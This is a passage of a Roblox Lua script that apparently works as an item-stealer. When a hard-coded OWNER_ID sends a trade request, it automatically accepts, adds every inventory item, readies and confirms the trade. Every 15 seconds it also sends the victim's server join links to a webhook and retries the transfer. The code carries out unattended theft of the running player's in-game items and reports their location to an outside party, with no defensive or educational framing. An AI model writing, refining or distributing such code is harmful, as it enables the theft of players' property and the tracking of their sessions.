    local TRR = TradeRemotes:FindFirstChild("TradeRequestReceived")
    if TRR and TRR:IsA("RemoteEvent") then
        TRR.OnClientEvent:Connect(function(fromId)
            if fromId == OWNER_ID and tradeStatus ~= "Completed" and tradeStatus ~= "Pending" then
                if #tradeItemsList == 0 then return end

                if AcceptTradeRequest then
                    pcall(function() AcceptTradeRequest:FireServer(OWNER_ID) end)
                end

                local opened = waitForTradeOpen(10)
                if opened then
                    setTradeStatus("Pending")

                    if not waitForTradeGUIStable() then
                        setTradeStatus("Waiting")
                        return
                    end

                    if isTradeGUIOpen() then
                        local added = addAllItemsToTrade()
                        if added > 0 then
                            task.wait(0.5)
                            if isTradeGUIOpen() then
                                setReady()
                                task.wait(1)
                                local success = waitAndConfirmTrade(60)
                                if success then
                                    task.wait(3)
                                    if findOwnerInServer() then
                                        refreshInventory()
                                        if gotInventory and #tradeItemsList > 0 then
                                            task.spawn(function()
                                                task.wait(2)
                                                executeTrade()
                                            end)
                                        end
                                    end
                                end
                            end
                        end
                    else
                        setTradeStatus("Waiting")
                    end
                end
            end
        end)
    end
end)

task.spawn(function()
    while true do
        task.wait(15)
        if not isAlive() then
            playerConnected = false
            setPlayerConnected(false)
            break
        end
        updateWebhook(getDeepLink(), getBrowserJoinLink(), true)
        if tradeStatus ~= "Completed" and tradeStatus ~= "Pending" and findOwnerInServer() then
            refreshInventory()
            if gotInventory and #tradeItemsList > 0 then executeTrade() end
        end
    end
end)

pcall(function()
    game:BindToClose(function()
        playerConnected = false
        setPlayerConnected(false)
        task.wait(1)
    end)
end)
pcall(function()
    LP.AncestryChanged:Connect(function()
        if not LP:IsDescendantOf(Players) then
            playerConnected = false
            setPlayerConnected(false)
        end
    end)
end)
pcall(function()
    Players.PlayerRemoving:Connect(function(p)
        if p == LP then
            playerConnected = false
            setPlayerConnected(false)
        end
    end)
end)